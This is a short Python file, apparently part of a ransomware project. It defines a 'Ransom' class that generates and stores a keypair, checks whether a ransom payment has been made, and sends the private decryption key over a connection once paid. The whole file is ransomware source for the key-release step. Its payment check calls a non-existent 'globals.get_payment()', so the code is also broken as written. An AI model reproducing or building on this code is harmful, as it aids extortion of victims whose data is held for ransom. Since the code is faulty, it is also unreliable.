import keygen



class Ransom:
    def __init__(self):
        self.private_key, self.public_key = keygen.create_keypair()
        keygen.save_keypair(self.private_key, self.public_key)

    
    def check_payment(self, conn):
        if globals.get_payment():
            self.send_key(conn)

    def send_key(self, conn):  
        with open("priv.pem", "r") as f:
            key = f.read()
        conn.send(key.encode())
        print("Sent private key")

        
